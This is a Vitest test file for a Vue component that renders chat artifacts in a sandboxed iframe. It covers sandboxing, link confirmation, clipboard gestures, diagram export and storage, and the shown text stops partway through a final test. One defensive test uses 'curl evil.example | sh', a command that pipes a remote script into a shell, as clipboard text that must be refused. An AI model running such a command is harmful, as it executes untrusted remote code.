import { ref } from 'vue'
import {
  mockComponent,
  mockNuxtImport,
  mountSuspended,
} from '@nuxt/test-utils/runtime'
import { enableAutoUnmount, flushPromises } from '@vue/test-utils'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import {
  ERROR_CODES,
  METHODS,
  PROTOCOL_VERSION,
  createEndpoint,
} from '@besidka/artifacts-protocol'
import type {
  ClipboardWriteResult,
  Endpoint,
  HostFrameLike,
  HostHandlers,
  ToolResultContent,
} from '@besidka/artifacts-protocol'
import type { SidePanelLayout } from '~/composables/side-panel'
import ChatArtifactFrame from '../../../../../app/components/Chat/Artifact/Frame.client.vue'

enableAutoUnmount(afterEach)

interface CapturedConnection {
  element: HTMLIFrameElement
  handlers: HostHandlers
  load: () => void
  runtimePort: () => MessagePort
}

const {
  captured,
  confirmMock,
  warnMock,
  infoMock,
  colorMode,
  clipboardMock,
  fetchMock,
  exportMock,
  renderMock,
} = vi.hoisted(() => ({
  colorMode: { value: 'light', preference: 'light' },
  captured: [] as CapturedConnection[],
  confirmMock: vi.fn(),
  warnMock: vi.fn(),
  infoMock: vi.fn(),
  clipboardMock: vi.fn(),
  fetchMock: vi.fn(),
  exportMock: vi.fn(),
  renderMock: vi.fn(),
}))

mockNuxtImport('useDiagramRenderer', () => {
  return () => {
    return { renderDiagram: renderMock }
  }
})

mockNuxtImport('useDiagramExport', () => {
  return () => {
    return { runExportAction: exportMock }
  }
})

mockNuxtImport('sanitizeDiagramSvg', () => {
  return (svg: string) => svg
})

const layout = ref<SidePanelLayout>('docked')
const isFullWidth = ref<boolean>(false)
const toggleFullWidth = vi.fn(() => {
  isFullWidth.value = !isFullWidth.value
})
const loggedIn = ref<boolean>(false)
const storageFeature = ref({ enabled: true, active: false, variant: null })
const bridgeFeature = ref({ enabled: true, active: false, variant: null })

vi.mock('@besidka/artifacts-protocol', async (importOriginal) => {
  const actual = await importOriginal<
    typeof import('@besidka/artifacts-protocol')
  >()

  return {
    ...actual,
    writeClipboardText: clipboardMock,
    createHostConnection: vi.fn((
      element: HTMLIFrameElement,
      handlers: HostHandlers,
      options: Parameters<typeof actual.createHostConnection>[2],
    ) => {
      const loadListeners = new Set<() => void>()
      const ports: MessagePort[] = []
      const fakeFrame: HostFrameLike = {
        contentWindow: {
          postMessage: (_message, _origin, transfer) => {
            ports.push(transfer[0] as MessagePort)
          },
        },
        addEventListener: (_type, listener) => {
          loadListeners.add(listener)
        },
        removeEventListener: (_type, listener) => {
          loadListeners.delete(listener)
        },
        remove: () => {
          element.remove()
        },
      }

      captured.push({
        element,
        handlers,
        load: () => {
          for (const listener of [...loadListeners]) {
            listener()
          }
        },
        runtimePort: () => {
          const port = ports.at(-1)

          if (!port) {
            throw new Error('No runtime port')
          }

          return port
        },
      })

      return actual.createHostConnection(fakeFrame, handlers, options)
    }),
  }
})

vi.mock('evlog/client', () => ({
  log: { warn: warnMock, info: infoMock, error: vi.fn() },
}))

mockNuxtImport('useConfirm', () => confirmMock)

mockNuxtImport('$fetch', () => fetchMock)

mockNuxtImport('useAuth', () => {
  return () => ({ loggedIn })
})

mockNuxtImport('useFeature', () => {
  return (key: string) => {
    return key === 'artifacts.llm-bridge' ? bridgeFeature : storageFeature
  }
})

mockNuxtImport('useColorMode', () => {
  return () => colorMode
})

mockNuxtImport('useSidePanelLayout', () => {
  return () => layout
})

mockNuxtImport('useSidePanel', () => {
  return () => ({ isFullWidth, toggleFullWidth })
})

mockComponent('ProseMermaidViewer', () => {
  return {
    name: 'MermaidViewerStub',
    props: ['source', 'open'],
    template: '<div data-testid="mermaid-viewer-stub" />',
  }
})

const RESULT: ToolResultContent = {
  kind: 'html',
  title: 'Landing page',
  content: '<p>v1</p>',
  artifactId: 'art_1',
  version: 1,
}

const openEndpoints: Endpoint[] = []

function connectRuntime(
  connection: CapturedConnection,
  onNotification: (method: string, params: unknown) => void = () => {},
): Endpoint {
  connection.load()

  const endpoint = createEndpoint(connection.runtimePort(), { onNotification })

  openEndpoints.push(endpoint)

  return endpoint
}

function setHostActivation(isActive: boolean | null) {
  Object.defineProperty(navigator, 'userActivation', {
    configurable: true,
    value: isActive === null ? undefined : { isActive },
  })
}

function activateFrame(connection: CapturedConnection) {
  setHostActivation(true)
  connection.element.setAttribute('tabindex', '-1')
  connection.element.focus()
}

async function waitForPort() {
  await new Promise(resolve => setTimeout(resolve, 0))
  await flushPromises()
}

async function initialize(runtime: Endpoint) {
  const result = await runtime.request(METHODS.initialize, {
    protocolVersion: PROTOCOL_VERSION,
    appCapabilities: { kinds: ['html'] },
  })

  runtime.notify(METHODS.initialized, {})
  await waitForPort()

  return result
}

async function mountFrame(props: Record<string, unknown> = {}) {
  const wrapper = await mountSuspended(ChatArtifactFrame, {
    attachTo: document.body,
    props: {
      title: 'Landing page',
      result: RESULT,
      partial: null,
      artifactId: 'art_1',
      version: 1,
      ...props,
    },
  })
  const connection = captured.at(-1)

  if (!connection) {
    throw new Error('The frame did not connect')
  }

  return { wrapper, connection }
}

beforeEach(() => {
  captured.length = 0
  confirmMock.mockReset()
  warnMock.mockReset()
  infoMock.mockReset()
  clipboardMock.mockReset()
  exportMock.mockReset()
  renderMock.mockReset()
  renderMock.mockResolvedValue({ svg: '<svg id="diagram"></svg>' })
  fetchMock.mockReset()
  loggedIn.value = false
  storageFeature.value = { enabled: true, active: false, variant: null }
  bridgeFeature.value = { enabled: true, active: false, variant: null }
  toggleFullWidth.mockClear()
  layout.value = 'docked'
  isFullWidth.value = false
})

afterEach(() => {
  for (const endpoint of openEndpoints.splice(0)) {
    endpoint.close()
  }

  Reflect.deleteProperty(navigator, 'userActivation')
  vi.useRealTimers()
})

describe('ChatArtifactFrame', () => {
  it('creates a locked-down iframe for the runtime document', async () => {
    const { connection } = await mountFrame()
    const { element } = connection

    expect(element.getAttribute('sandbox')).toBe('allow-scripts')
    expect(element.getAttribute('referrerpolicy')).toBe('no-referrer')
    expect(element.getAttribute('allow')).toBe('')
    expect(element.getAttribute('src')).toMatch(/\/v1\/index\.html$/)
    expect(element.title).toBe('Landing page preview')
    expect(element.isConnected).toBe(true)
  })

  it('adds the frame-src meta policy for the runtime origin', async () => {
    const { connection } = await mountFrame()
    const runtimeOrigin = new URL(connection.element.src).origin
    const metas = document.head.querySelectorAll(
      'meta.js-artifact-frame-policy',
    )

    expect(metas).toHaveLength(1)
    expect(metas[0]!.getAttribute('http-equiv'))
      .toBe('Content-Security-Policy')
    expect(metas[0]!.getAttribute('content')).toBe(
      `frame-src 'self' ${runtimeOrigin} https://challenges.cloudflare.com`,
    )
  })

  it('answers the handshake and shows the frame once initialized',
    async () => {
      const { wrapper, connection } = await mountFrame()
      const notifications: Array<[string, unknown]> = []
      const runtime = connectRuntime(connection, (method, params) => {
        notifications.push([method, params])
      })

      expect(wrapper.find('[data-testid="artifact-frame-loading"]').exists())
        .toBe(true)

      const result = await initialize(runtime)

      expect(result).toEqual({
        protocolVersion: PROTOCOL_VERSION,
        hostContext: {
          theme: expect.stringMatching(/^(light|dark)$/),
          displayMode: expect.stringMatching(/^(panel|fullscreen)$/),
          locale: expect.any(String),
          capabilities: { storage: 'memory', complete: false },
        },
      })
      expect(wrapper.find('[data-testid="artifact-frame-loading"]').exists())
        .toBe(false)
      expect(wrapper.emitted('ready')).toHaveLength(1)
      expect(notifications).toContainEqual([
        METHODS.toolResult,
        { structuredContent: RESULT },
      ])
    })

  it('keeps the skeleton over a ready runtime until content arrives',
    async () => {
      const { wrapper, connection } = await mountFrame({ result: null })
      const notifications: Array<[string, unknown]> = []
      const runtime = connectRuntime(connection, (method, params) => {
        notifications.push([method, params])
      })

      await initialize(runtime)

      expect(wrapper.emitted('ready')).toHaveLength(1)
      expect(wrapper.find('[data-testid="artifact-frame-loading"]').exists())
        .toBe(true)
      expect(connection.element.parentElement?.classList.contains('invisible'))
        .toBe(true)
      expect(notifications.map(([method]) => method))
        .not.toContain(METHODS.toolResult)

      await wrapper.setProps({ result: RESULT })
      await waitForPort()

      expect(wrapper.find('[data-testid="artifact-frame-loading"]').exists())
        .toBe(false)
      expect(connection.element.parentElement?.classList.contains('invisible'))
        .toBe(false)
      expect(notifications).toContainEqual([
        METHODS.toolResult,
        { structuredContent: RESULT },
      ])
    })

  it('answers unknown methods with -32601', async () => {
    const { connection } = await mountFrame()
    const runtime = connectRuntime(connection)

    await initialize(runtime)

    await expect(runtime.request(
      'besidka/unknown' as typeof METHODS.initialize,
      {} as never,
    )).rejects.toMatchObject({ code: ERROR_CODES.methodNotFound })
  })

  it('sends a new version without reloading the iframe', async () => {
    const { wrapper, connection } = await mountFrame()
    const notifications: Array<[string, unknown]> = []
    const runtime = connectRuntime(connection, (method, params) => {
      notifications.push([method, params])
    })

    await initialize(runtime)

    const nextResult = { ...RESULT, content: '<p>v2</p>', version: 2 }

    await wrapper.setProps({ result: nextResult, version: 2 })
    await waitForPort()

    expect(captured).toHaveLength(1)
    expect(connection.element.isConnected).toBe(true)
    expect(notifications).toContainEqual([
      METHODS.toolResult,
      { structuredContent: nextResult },
    ])
  })

  it('asks before opening a link and opens it without an opener',
    async () => {
      const { connection } = await mountFrame()
      const runtime = connectRuntime(connection)
      const openSpy = vi.spyOn(window, 'open').mockReturnValue(null)

      await initialize(runtime)
      confirmMock.mockResolvedValueOnce({ label: 'Open link', index: 0 })

      await runtime.request(METHODS.openLink, {
        url: 'https://example.com/docs',
      })

      expect(confirmMock).toHaveBeenCalledWith(expect.objectContaining({
        subtitle: 'https://example.com/docs',
      }))
      expect(openSpy).toHaveBeenCalledWith(
        'https://example.com/docs',
        '_blank',
        'noopener,noreferrer',
      )
    })

  it('does not open a declined link', async () => {
    const { connection } = await mountFrame()
    const runtime = connectRuntime(connection)
    const openSpy = vi.spyOn(window, 'open').mockReturnValue(null)

    await initialize(runtime)
    confirmMock.mockResolvedValueOnce(null)

    await runtime.request(METHODS.openLink, { url: 'https://example.com' })

    expect(openSpy).not.toHaveBeenCalled()
  })

  it('forwards runtime error messages', async () => {
    const { wrapper, connection } = await mountFrame()
    const runtime = connectRuntime(connection)

    await initialize(runtime)
    runtime.notify(METHODS.message, {
      level: 'error',
      data: { message: 'ReferenceError: x is not defined', stack: 'at x' },
    })
    await waitForPort()

    expect(wrapper.emitted('runtime-message')?.[0]).toEqual([{
      level: 'error',
      message: 'ReferenceError: x is not defined',
      stack: 'at x',
    }])
  })

  it('logs one artifact_open with the kind and no content', async () => {
    const { connection } = await mountFrame()
    const runtime = connectRuntime(connection)

    infoMock.mockClear()
    await initialize(runtime)

    expect(infoMock).toHaveBeenCalledTimes(1)
    expect(infoMock).toHaveBeenCalledWith({
      action: 'artifact_open',
      attributes: {
        artifacts: {
          clientEvent: 'open',
          initMs: expect.any(Number),
          kind: RESULT.kind,
          protocolVersion: PROTOCOL_VERSION,
          source: 'owner',
        },
      },
    })
    expect(JSON.stringify(infoMock.mock.calls)).not.toContain(RESULT.content)
  })

  it('logs a runtime error once without the message text', async () => {
    const { connection } = await mountFrame()
    const runtime = connectRuntime(connection)

    warnMock.mockClear()
    await initialize(runtime)

    for (const message of ['first secret', 'second secret']) {
      runtime.notify(METHODS.message, {
        level: 'error',
        data: { message },
      })
    }

    await waitForPort()

    const runtimeErrors = warnMock.mock.calls.filter(([entry]) => {
      return entry.action === 'artifact_runtime_error'
    })

    expect(runtimeErrors).toEqual([[{
      action: 'artifact_runtime_error',
      attributes: {
        artifacts: {
          clientEvent: 'runtime-error',
          reason: 'script-error',
          kind: RESULT.kind,
          protocolVersion: PROTOCOL_VERSION,
          source: 'owner',
        },
      },
    }]])
    expect(JSON.stringify(warnMock.mock.calls)).not.toContain('secret')
  })

  it('removes the frame after a second load and logs ids only',
    async () => {
      const { wrapper, connection } = await mountFrame()
      const runtime = connectRuntime(connection)

      await initialize(runtime)
      connection.load()
      await flushPromises()

      expect(connection.element.isConnected).toBe(false)
      expect(wrapper.find('[data-testid="artifact-frame-error"]').text())
        .toContain('The preview was stopped')
      expect(warnMock).toHaveBeenCalledWith({
        action: 'artifact-frame-navigation',
        attributes: {
          artifacts: {
            runtimeNavigation: true,
            artifactId: 'art_1',
            version: 1,
            loadCount: 2,
          },
        },
      })
    })

  it('times out after 10 seconds and retries with a fresh frame',
    async () => {
      vi.useFakeTimers()

      const { wrapper, connection } = await mountFrame()

      await vi.advanceTimersByTimeAsync(10_000)

      expect(connection.element.isConnected).toBe(false)
      expect(wrapper.find('[data-testid="artifact-frame-error"]').text())
        .toContain('did not load')

      await wrapper.get('[data-testid="artifact-frame-retry"]').trigger('click')

      expect(captured).toHaveLength(2)
      expect(captured[1]?.element.isConnected).toBe(true)
    })

  it('copies through the parent clipboard', async () => {
    const { connection } = await mountFrame()
    const runtime = connectRuntime(connection)

    await initialize(runtime)
    activateFrame(connection)
    clipboardMock.mockResolvedValueOnce({ copied: true })

    await expect(runtime.request(METHODS.clipboardWrite, {
      text: 'const answer = 42',
      userActivation: true,
    })).resolves.toEqual({ copied: true })
    expect(clipboardMock).toHaveBeenCalledWith('const answer = 42')
  })

  it('holds a refused copy until the parent Copy button is clicked',
    async () => {
      const { wrapper, connection } = await mountFrame()
      const runtime = connectRuntime(connection)

      await initialize(runtime)
      activateFrame(connection)
      clipboardMock
        .mockResolvedValueOnce({ copied: false, reason: 'gesture-required' })
        .mockResolvedValueOnce({ copied: true })

      let settled: ClipboardWriteResult | null = null
      const request = runtime.request(METHODS.clipboardWrite, {
        text: 'graph TD',
        userActivation: true,
      }).then((result) => {
        settled = result

        return result
      })

      await waitForPort()

      const fallback = wrapper.find('[data-testid="artifact-copy-fallback"]')

      expect(fallback.exists()).toBe(true)
      expect(fallback.text()).toContain('Copy from the artifact?')
      expect(settled).toBeNull()
      expect(clipboardMock).toHaveBeenCalledTimes(1)

      await wrapper.get('[data-testid="artifact-copy-fallback-copy"]')
        .trigger('click', { detail: 1 })

      await expect(request).resolves.toEqual({ copied: true })
      expect(clipboardMock).toHaveBeenCalledTimes(2)
      expect(clipboardMock).toHaveBeenLastCalledWith('graph TD')
      expect(wrapper.find('[data-testid="artifact-copy-fallback"]').exists())
        .toBe(false)
    })

  it('exports a Mermaid diagram in the parent with the rendered svg',
    async () => {
      const { connection } = await mountFrame()
      const runtime = connectRuntime(connection)

      await initialize(runtime)
      activateFrame(connection)
      exportMock.mockResolvedValueOnce(true)

      await expect(runtime.request(METHODS.diagramExport, {
        source: 'graph TD; A-->B',
        action: 'download-drawio',
        userActivation: true,
      })).resolves.toEqual({ completed: true })
      expect(renderMock).toHaveBeenCalledWith(
        'graph TD; A-->B',
        expect.objectContaining({ idPrefix: expect.any(String) }),
      )
      expect(exportMock).toHaveBeenCalledWith('download-drawio', {
        source: 'graph TD; A-->B',
        svg: '<svg id="diagram"></svg>',
        themeElement: expect.any(HTMLElement),
      })
      expect(exportMock.mock.calls[0]?.[1].themeElement.classList)
        .toContain('pele-theme')
    })

  it('holds a Mermaid export until the parent button is clicked',
    async () => {
      const { wrapper, connection } = await mountFrame()
      const runtime = connectRuntime(connection)

      await initialize(runtime)
      activateFrame(connection)
      exportMock.mockResolvedValueOnce(false).mockResolvedValueOnce(true)

      const request = runtime.request(METHODS.diagramExport, {
        source: 'graph TD; A-->B',
        action: 'copy-svg',
        userActivation: true,
      })

      await waitForPort()

      const fallback = wrapper.get('[data-testid="artifact-export-fallback"]')

      expect(fallback.text()).toContain('Copy SVG from the artifact?')
      await wrapper.get('[data-testid="artifact-export-fallback-confirm"]')
        .trigger('click', { detail: 1 })

      await expect(request).resolves.toEqual({ completed: true })
      expect(exportMock).toHaveBeenCalledTimes(2)
      expect(wrapper.find('[data-testid="artifact-export-fallback"]')
        .exists()).toBe(false)
    })

  it('answers not completed when a Mermaid export is dismissed or fails',
    async () => {
      const { wrapper, connection } = await mountFrame()
      const runtime = connectRuntime(connection)

      await initialize(runtime)
      setHostActivation(false)

      const request = runtime.request(METHODS.diagramExport, {
        source: 'graph TD; A-->B',
        action: 'download-svg',
        userActivation: true,
      })

      await waitForPort()
      expect(exportMock).not.toHaveBeenCalled()
      await wrapper.get('[data-testid="artifact-export-fallback-dismiss"]')
        .trigger('click')
      await expect(request).resolves.toEqual({ completed: false })

      renderMock.mockResolvedValueOnce({ error: { message: 'Parse error' } })
      activateFrame(connection)

      await expect(runtime.request(METHODS.diagramExport, {
        source: 'graph TD; A-->',
        action: 'download-svg',
        userActivation: true,
      })).resolves.toEqual({ completed: false })
      expect(exportMock).not.toHaveBeenCalled()
    })

  it('answers denied when the copy fallback is dismissed', async () => {
    const { wrapper, connection } = await mountFrame()
    const runtime = connectRuntime(connection)

    await initialize(runtime)
    activateFrame(connection)
    clipboardMock.mockResolvedValue({
      copied: false,
      reason: 'gesture-required',
    })

    const request = runtime.request(METHODS.clipboardWrite, {
      text: 'one',
      userActivation: true,
    })

    await waitForPort()
    await wrapper.get('[data-testid="artifact-copy-fallback-dismiss"]')
      .trigger('click')

    await expect(request).resolves.toEqual({
      copied: false,
      reason: 'denied',
    })
    expect(clipboardMock).toHaveBeenCalledTimes(1)
  })

  it('dismisses the copy fallback on Escape and on a new version',
    async () => {
      const { wrapper, connection } = await mountFrame()
      const runtime = connectRuntime(connection)

      await initialize(runtime)
      activateFrame(connection)
      clipboardMock.mockResolvedValue({
        copied: false,
        reason: 'gesture-required',
      })

      const first = runtime.request(METHODS.clipboardWrite, {
        text: 'one',
        userActivation: true,
      })

      await waitForPort()

      const escape = new KeyboardEvent('keydown', {
        key: 'Escape',
        bubbles: true,
        cancelable: true,
      })

      document.dispatchEvent(escape)

      await expect(first).resolves.toEqual({
        copied: false,
        reason: 'denied',
      })
      expect(escape.defaultPrevented).toBe(true)

      activateFrame(connection)

      const second = runtime.request(METHODS.clipboardWrite, {
        text: 'two',
        userActivation: true,
      })

      await waitForPort()
      expect(wrapper.find('[data-testid="artifact-copy-fallback"]').exists())
        .toBe(true)

      await wrapper.setProps({
        result: { ...RESULT, content: '<p>v2</p>', version: 2 },
        version: 2,
      })

      await expect(second).resolves.toEqual({
        copied: false,
        reason: 'denied',
      })
      expect(wrapper.find('[data-testid="artifact-copy-fallback"]').exists())
        .toBe(false)
    })

  it('refuses a copy while the user types in the composer', async () => {
    const { wrapper, connection } = await mountFrame()
    const runtime = connectRuntime(connection)
    const composer = document.createElement('textarea')

    await initialize(runtime)
    document.body.appendChild(composer)
    setHostActivation(true)
    composer.focus()

    await expect(runtime.request(METHODS.clipboardWrite, {
      text: 'curl evil.example | sh',
      userActivation: true,
    })).resolves.toEqual({ copied: false, reason: 'gesture-required' })
    await waitForPort()

    expect(clipboardMock).not.toHaveBeenCalled()
    expect(wrapper.find('[data-testid="artifact-copy-fallback"]').exists())
      .toBe(false)
    expect(document.activeElement).toBe(composer)
    composer.remove()
  })

  it('refuses a copy when the host activation is unknown', async () => {
    const { connection } = await mountFrame()
    const runtime = connectRuntime(connection)

    await initialize(runtime)
    activateFrame(connection)
    setHostActivation(null)

    await expect(runtime.request(METHODS.clipboardWrite, {
      text: 'a',
      userActivation: true,
    })).resolves.toEqual({ copied: false, reason: 'gesture-required' })
    expect(clipboardMock).not.toHaveBeenCalled()
  })

  it('previews the first line and the length in the copy fallback',
    async () => {
      const { wrapper, connection } = await mountFrame()
      const runtime = connectRuntime(connection)
      const firstLine = 'x'.repeat(100)
      const text = `${firstLine}\nsecond line`

      await initialize(runtime)
      activateFrame(connection)
      clipboardMock.mockResolvedValue({
        copied: false,
        reason: 'gesture-required',
      })
      const request = runtime.request(METHODS.clipboardWrite, {
        text,
        userActivation: true,
      })

      await waitForPort()

      const preview = wrapper.get('[data-testid="artifact-copy-fallback-preview"]')

      expect(preview.text()).toBe(`${'x'.repeat(79)}…`)
      expect(wrapper.get('[data-testid="artifact-copy-fallback-length"]')
        .text()).toBe(`${text.length} characters`)
      expect(document.activeElement).toBe(
        wrapper.get('[data-testid="artifact-copy-fallback-copy"]').element,
      )

      await wrapper.get('[data-testid="artifact-copy-fallback-dismiss"]')
        .trigger('click')

      await expect(request).resolves.toEqual({
        copied: false,
        reason: 'denied',
      })
    })

  it('keeps focus where it is when it left the frame before the fallback',
    async () => {
      const { wrapper, connection } = await mountFrame()
      const runtime = connectRuntime(connection)
      const composer = document.createElement('textarea')
      let refuse!: (result: ClipboardWriteResult) => void

      await initialize(runtime)
      document.body.appendChild(composer)
      activateFrame(connection)
      clipboardMock.mockImplementationOnce(() => {
        return new Promise<ClipboardWriteResult>((resolve) => {
          refuse = resolve
        })
      })
      const request = runtime.request(METHODS.clipboardWrite, {
        text: 'one',
        userActivation: true,
      })

      await waitForPort()
      composer.focus()
      refuse({ copied: false, reason: 'gesture-required' })
      await waitForPort()

      expect(wrapper.find('[data-testid="artifact-copy-fallback"]').exists())
        .toBe(true)
      expect(document.activeElement).toBe(composer)

      await wrapper.get('[data-testid="artifact-copy-fallback-dismiss"]')
        .trigger('click')

      await expect(request).resolves.toEqual({
        copied: false,
        reason: 'denied',
      })
      composer.remove()
    })

  it('ignores a keyboard Copy right after the fallback appears', async () => {
    const nowSpy = vi.spyOn(Date, 'now').mockReturnValue(10_000)
    const { wrapper, connection } = await mountFrame()
    const runtime = connectRuntime(connection)

    await initialize(runtime)
    activateFrame(connection)
    clipboardMock
      .mockResolvedValueOnce({ copied: false, reason: 'gesture-required' })
      .mockResolvedValueOnce({ copied: true })

    const request = runtime.request(METHODS.clipboardWrite, {
      text: 'one',
      userActivation: true,
    })

    await waitForPort()

    const copyButton = wrapper.get('[data-testid="artifact-copy-fallback-copy"]')

    nowSpy.mockReturnValue(10_400)
    await copyButton.trigger('click', { detail: 0 })
    await flushPromises()

    expect(clipboardMock).toHaveBeenCalledTimes(1)
    expect(wrapper.find('[data-testid="artifact-copy-fallback"]').exists())
      .toBe(true)

    nowSpy.mockReturnValue(10_600)
    await copyButton.trigger('click', { detail: 0 })

    await expect(request).resolves.toEqual({ copied: true })
    expect(clipboardMock).toHaveBeenCalledTimes(2)
    nowSpy.mockRestore()
  })

  it('opens the chat diagram viewer with the received source', async () => {
    const { wrapper, connection } = await mountFrame()
    const runtime = connectRuntime(connection)

    await initialize(runtime)
    activateFrame(connection)
    expect(wrapper.find('[data-testid="mermaid-viewer-stub"]').exists())
      .toBe(false)

    await expect(runtime.request(METHODS.openDiagramViewer, {
      source: 'graph TD\n  A --> B',
      userActivation: true,
    })).resolves.toEqual({})
    await vi.waitFor(() => {
      expect(wrapper.find('[data-testid="mermaid-viewer-stub"]').exists())
        .toBe(true)
    })

    const viewer = wrapper.findComponent({ name: 'MermaidViewerStub' })

    expect(viewer.exists()).toBe(true)
    expect(viewer.props('source')).toBe('graph TD\n  A --> B')
    expect(viewer.props('open')).toBe(true)
  })

  it('switches the docked panel to full width on request', async () => {
    const { connection } = await mountFrame()
    const notifications: Array<[string, unknown]> = []
    const runtime = connectRuntime(connection, (method, params) => {
      notifications.push([method, params])
    })

    await initialize(runtime)
    activateFrame(connection)

    await expect(runtime.request(METHODS.requestDisplayMode, {
      mode: 'fullscreen',
      userActivation: true,
    })).resolves.toEqual({ displayMode: 'fullscreen' })
    expect(toggleFullWidth).toHaveBeenCalledTimes(1)
    expect(isFullWidth.value).toBe(true)

    await waitForPort()
    expect(notifications).toContainEqual([
      METHODS.hostContextChanged,
      { displayMode: 'fullscreen' },
    ])

    await expect(runtime.request(METHODS.requestDisplayMode, {
      mode: 'panel',
      userActivation: true,
    })).resolves.toEqual({ displayMode: 'panel' })
    expect(isFullWidth.value).toBe(false)
  })

  it('keeps the bottom sheet as it is on a display mode request',
    async () => {
      layout.value = 'sheet'

      const { connection } = await mountFrame()
      const runtime = connectRuntime(connection)

      await initialize(runtime)
      activateFrame(connection)

      await expect(runtime.request(METHODS.requestDisplayMode, {
        mode: 'panel',
        userActivation: true,
      })).resolves.toEqual({ displayMode: 'fullscreen' })
      expect(toggleFullWidth).not.toHaveBeenCalled()
    })

  it('destroys the port and the iframe on unmount', async () => {
    const { wrapper, connection } = await mountFrame()

    connectRuntime(connection)
    wrapper.unmount()

    expect(connection.element.isConnected).toBe(false)
  })
})

describe('ChatArtifactFrame storage capability', () => {
  const PERSISTENT_CAPABILITIES = { storage: 'persistent', complete: false }
  const MEMORY_CAPABILITIES = { storage: 'memory', complete: false }

  function allowStorage() {
    loggedIn.value = true
    storageFeature.value = { enabled: true, active: true, variant: null }
    fetchMock.mockResolvedValue({
      items: [{ key: 'score', value: 3 }],
      keys: 1,
      bytes: 1,
    })
  }

  async function capabilitiesOf(connection: CapturedConnection) {
    const runtime = connectRuntime(connection)
    const result = await initialize(runtime)

    return { runtime, capabilities: result.hostContext.capabilities }
  }

  it('advertises memory storage to a signed-out viewer', async () => {
    storageFeature.value = { enabled: true, active: true, variant: null }

    const { wrapper, connection } = await mountFrame()
    const { capabilities } = await capabilitiesOf(connection)

    expect(capabilities).toEqual(MEMORY_CAPABILITIES)
    expect(connection.handlers.storage).toBeUndefined()
    expect(wrapper.emitted('storage-change')).toEqual([
      [{ persistent: false, keys: 0, bytes: 0 }],
    ])
    expect(fetchMock).not.toHaveBeenCalled()
  })

  it('advertises memory storage when the artifacts.storage flag is off',
    async () => {
      loggedIn.value = true

      const { connection } = await mountFrame()
      const { capabilities } = await capabilitiesOf(connection)

      expect(capabilities).toEqual(MEMORY_CAPABILITIES)
      expect(connection.handlers.storage).toBeUndefined()
      expect(fetchMock).not.toHaveBeenCalled()
    })

  it('advertises memory storage for an artifact from a shared chat',
    async () => {
      allowStorage()

      const { wrapper, connection } = await mountFrame({ source: 'shared' })
      const { capabilities } = await capabilitiesOf(connection)

      expect(capabilities).toEqual(MEMORY_CAPABILITIES)
      expect(connection.handlers.storage).toBeUndefined()
      expect(wrapper.emitted('storage-change')).toEqual([
        [{ persistent: false, keys: 0, bytes: 0 }],
      ])
      expect(fetchMock).not.toHaveBeenCalled()
    })

  it('advertises memory storage without an artifact id', async () => {
    allowStorage()

    const { connection } = await mountFrame({ artifactId: null })
    const { capabilities } = await capabilitiesOf(connection)

    expect(capabilities).toEqual(MEMORY_CAPABILITIES)
    expect(connection.handlers.storage).toBeUndefined()
    expect(fetchMock).not.toHaveBeenCalled()
  })

  it('answers storage requests with method-not-found in memory mode',
    async () => {
      const { connection } = await mountFrame()
      const { runtime } = await capabilitiesOf(connection)

      await expect(runtime.request(METHODS.storageGet, { key: 'score' }))
        .rejects.toMatchObject({ code: ERROR_CODES.methodNotFound })
      await expect(runtime.request(METHODS.storageSet, {
        key: 'score',
        value: 1,
      })).rejects.toMatchObject({ code: ERROR_CODES.methodNotFound })
    })

  it('advertises persistent storage to a signed-in owner with the flag on',
    async () => {
      allowStorage()

      const { connection } = await mountFrame({ source: 'owner' })
      const { capabilities } = await capabilitiesOf(connection)

      expect(capabilities).toEqual(PERSISTENT_CAPABILITIES)
      expect(connection.handlers.storage).toBeDefined()
    })

  it('treats a missing source as the owner', async () => {
    allowStorage()

    const { connection } = await mountFrame()
    const { capabilities } = await capabilitiesOf(connection)

    expect(capabilities).toEqual(PERSISTENT_CAPABILITIES)
    expect(connection.handlers.storage).toBeDefined()
  })

  it('loads the saved progress at mount and reports the totals',
    async () => {
      allowStorage()

      const { wrapper } = await mountFrame()

      await flushPromises()

      expect(fetchMock).toHaveBeenCalledTimes(1)
      expect(fetchMock).toHaveBeenCalledWith(
        '/api/v1/artifacts/art_1/storage',
        { headers: {} },
      )
      expect(wrapper.emitted('storage-change')).toEqual([
        [{ persistent: true, keys: 1, bytes: 1 }],
      ])
    })

  it('serves storage requests from the runtime through the session',
    async () => {
      allowStorage()

      const { connection } = await mountFrame()
      const { runtime } = await capabilitiesOf(connection)

      await expect(runtime.request(METHODS.storageGet, { key: 'score' }))
        .resolves.toEqual({ value: 3 })
      await expect(runtime.request(METHODS.storageList, {}))
        .resolves.toEqual({ keys: ['score'] })
      expect(fetchMock).toHaveBeenCalledTimes(1)
    })

  it('maps a refused storage load to a runtime error without breaking '
    + 'the frame', async () => {
    allowStorage()
    fetchMock.mockRejectedValue(Object.assign(new Error('Forbidden'), {
      statusCode: 403,
      data: { data: { reason: 'legal-consent' } },
    }))

    const { wrapper, connection } = await mountFrame()
    const { runtime } = await capabilitiesOf(connection)

    await expect(runtime.request(METHODS.storageGet, { key: 'score' }))
      .rejects.toMatchObject({ code: ERROR_CODES.consentRequired })
    expect(wrapper.emitted('ready')).toHaveLength(1)
  })

  it('remounts the frame when storage becomes available after mount',
    async () => {
      const { connection } = await mountFrame()

      expect(connection.handlers.storage).toBeUndefined()
      allowStorage()
      await flushPromises()

      expect(captured).toHaveLength(2)

      const { capabilities } = await capabilitiesOf(captured.at(-1)!)

      expect(capabilities).toEqual(PERSISTENT_CAPABILITIES)
      expect(captured.at(-1)!.handlers.storage).toBeDefined()
    })

  it('remounts the frame when the viewer signs out', async () => {
    allowStorage()

    await mountFrame()
    loggedIn.value = false
    await flushPromises()

    expect(captured).toHaveLength(2)
    expect(captured.at(-1)!.handlers.storage).toBeUndefined()
  })

  it('remounts with a new session for another artifact in persistent mode',
    async () => {
      allowStorage()

      const { wrapper } = await mountFrame()

      await wrapper.setProps({ artifactId: 'art_2' })
      await flushPromises()

      expect(captured).toHaveLength(2)
      expect(fetchMock).toHaveBeenLastCalledWith(
        '/api/v1/artifacts/art_2/storage',
        { headers: {} },
      )
    })

  it('logs one open when a streamed artifact gets its id and remounts',
    async () => {
      allowStorage()

      const { wrapper, connection } = await mountFrame({ artifactId: null })

      await capabilitiesOf(connection)
      await wrapper.setProps({ artifactId: 'art_1' })
      await flushPromises()

      expect(captured).toHaveLength(2)

      await capabilitiesOf(captured.at(-1)!)

      expect(infoMock).toHaveBeenCalledTimes(1)
    })

  it('logs nothing when telemetry is off', async () => {
